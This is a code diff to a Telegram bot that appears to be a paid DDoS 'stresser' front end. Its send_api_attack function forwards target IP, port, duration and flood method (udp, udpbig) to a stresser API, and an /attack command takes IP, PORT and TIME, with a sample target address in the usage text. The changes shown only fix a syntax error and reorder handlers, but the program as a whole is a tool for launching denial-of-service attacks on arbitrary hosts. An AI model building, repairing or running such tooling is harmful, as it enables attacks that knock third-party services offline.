@@ -1,4 +1,4 @@
-# app.py - COMPLETE FIXED VERSION
+# app.py - COMPLETE FIXED VERSION WITH WORKING /start
 import os
 import logging
 import asyncio
@@ -556,10 +556,8 @@ async def send_attack_alert(attack_info):
 
 # ===== API ATTACK METHODS =====
 async def send_api_attack(target, port, duration, attack_num, method="udp"):
-    """Send attack to API with specified method"""
     url = "https://api.susstresser.com/panel/api/api.php"
     
-    # Map method names to API method names
     method_map = {
         "udp": "udp",
         "udpbig": "udpbig",
@@ -941,7 +939,8 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
                 return
     
-    args = context.args    if len(args) < 3:
+    args = context.args
+    if len(args) < 3:
         await update.message.reply_text(
             "❌ *Usage:* `/attack IP PORT TIME`\n\n"
             "Example: `/attack 91.108.17.41 32001 60`\n\n"
@@ -1915,7 +1914,7 @@ def run_bot():
     app = Application.builder().token(TELEGRAM_TOKEN).build()
     application = app
     
-    # Commands
+    # ===== COMMANDS (Highest Priority) =====
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("attack", attack_command))
     app.add_handler(CommandHandler("redeem", redeem_command))
@@ -1923,7 +1922,8 @@ def run_bot():
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(CommandHandler("cancel", cancel))
     
-    # Callbacks - Main
+    # ===== CALLBACK QUERY HANDLERS =====
+    # Main
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
     app.add_handler(CallbackQueryHandler(extra_methods_callback, pattern="^extra_methods$"))
     app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
@@ -1952,8 +1952,12 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(owner_banned_users, pattern="^owner_banned_users$"))
     app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
     
-    # Single message router
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
+    # ===== MESSAGE ROUTER (Lowest Priority) =====
+    # Only processes non-command text messages
+    app.add_handler(MessageHandler(
+        filters.TEXT & ~filters.COMMAND, 
+        message_router
+    ))
     
     loop.run_until_complete(app.initialize())
     loop.run_until_complete(app.start())
